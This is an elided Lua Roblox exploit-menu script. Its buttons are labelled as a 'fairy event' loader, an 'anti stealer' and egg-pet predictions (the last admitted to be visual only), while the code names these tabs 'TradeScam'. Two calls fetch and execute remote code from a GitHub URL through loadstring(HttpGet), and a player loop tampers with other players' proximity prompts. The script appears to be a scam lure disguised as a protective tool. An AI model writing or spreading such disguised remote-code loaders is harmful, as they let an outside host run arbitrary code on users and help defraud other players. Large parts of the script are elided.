...
local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/textboy-roblox-scripter/shadow-scripting/refs/heads/main/Dark"))()
...
do
    ...
    Tabs.TradeScamSection =
        Window:Section(
        {
            Title = "FAIRY EVENT + anti stealer",
            Icon = "shield-alert",
            Opened = false
        }
    )
...
Tabs.EggESPTab:Paragraph(
    {
        ...
        Desc = "Visual pet prediction system for your eggs",
        Image = "eye",
        Color = "Red"
    }
)
...
Tabs.EggESPTab:Button(
    {
        Title = "Reroll Predictions(visual only)",
        Icon = "refresh-cw",
        Callback = function()
...
Tabs.TradeScamTab:Button(
    {
        Title = "LOAD FAIRY EVENT SCRIPT",
        Icon = "shield-alert",
        Callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/textboy-roblox-scripter/shadow-scripting/refs/heads/main/ok.lua'))()
        end
    }
)
Tabs.TradeScamTab:Button({
    Title = "ANTI STEALER START",
    Icon = "shield-alert",
    Callback = function()
                ...
                for _, player in pairs(Players:GetPlayers()) do
                    if player ~= LocalPlayer then
                        ...
                        if character then
                            ...
                            -- Destroy any proximity prompts in HRP
